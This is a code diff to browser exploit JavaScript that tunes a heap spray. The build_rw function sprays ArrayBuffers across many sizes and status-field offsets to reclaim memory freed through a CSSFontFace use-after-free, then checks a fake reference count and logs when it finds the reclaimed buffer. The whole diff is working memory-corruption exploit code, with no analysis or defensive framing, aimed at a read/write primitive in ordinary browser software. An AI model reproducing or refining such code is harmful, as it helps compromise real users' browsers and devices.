@@ -1113,25 +1113,42 @@ function build_rw(result) {
     style.sheet.deleteRule(0);
     document.body.offsetTop;
 
-    for (let i = 0; i < abs.length; i++) {
-      const ab = new ArrayBuffer(0x70);
-      const view = new DataView(ab);
-      view.setBInt(8, 1, true);
-      for (let si = 0; si < 30; si++) {
-        try { view.setUint8(0x10 + si * 4, 3); } catch(e) {}
-        try { view.setUint8(0x10 + si * 4 + 2, 3); } catch(e) {}
-      }
-      abs[i] = ab;
-    }
+    // Try MULTIPLE ArrayBuffer sizes to match the CSSFontFace size
+    const css_sizes = [0x60, 0x70, 0x80, 0x90, 0xA0, 0xB0, 0xC0, 0xD0, 0xE0, 0xF0, 0x100, 0x110, 0x120, 0x130, 0x140, 0x150, 0x160, 0x170, 0x180, 0x50, 0x40, 0x30];
+    const status_offsets = [0x50, 0x60, 0x70, 0x80, 0x90, 0xA0, 0x9A, 0x82, 0x92, 0xA2, 0xB2, 0x42, 0x32, 0x22, 0x12, 0x02, 0x62, 0x72, 0x88, 0x98, 0xA8, 0xB8, 0x40, 0x48, 0x58, 0x68, 0x78, 0x7A, 0x8A, 0x5A, 0x6A, 0x7A, 0x8A, 0x4A, 0x5A, 0x6A, 0x7A];
 
     let uaf_ab = null;
-    for (const ab of abs) {
-      try {
-        if (new DataView(ab).getBInt(8, true).eq(2)) { uaf_ab = ab; break; }
-      } catch(e) {}
+
+    for (let si = 0; si < css_sizes.length && !uaf_ab; si++) {
+      const size = css_sizes[si];
+      // Re-spray with this size
+      for (let i = 0; i < abs.length; i++) {
+        const ab = new ArrayBuffer(size);
+        const view = new DataView(ab);
+        view.setBInt(8, 1, true);
+        for (let so = 0; so < status_offsets.length; so++) {
+          try { view.setUint8(status_offsets[so], 3); } catch(e) {}
+          try { view.setUint8(status_offsets[so] + 2, 3); } catch(e) {}
+        }
+        abs[i] = ab;
+      }
+
+      // Check for ref count 2
+      for (const ab of abs) {
+        try {
+          if (new DataView(ab).getBInt(8, true).eq(2)) {
+            uaf_ab = ab;
+            logger.info("FontFaceSet: found UAF ArrayBuffer at size " + size.toString(16));
+            break;
+          }
+        } catch(e) {}
+      }
     }
 
-    if (!uaf_ab) return null;
+    if (!uaf_ab) {
+      logger.info("FontFaceSet: no UAF ArrayBuffer found with any size");
+      return null;
+    }
     return { uaf_ab, uaf_font, leak: { obj: 0 }, leak_addr: undefined };
   }
 
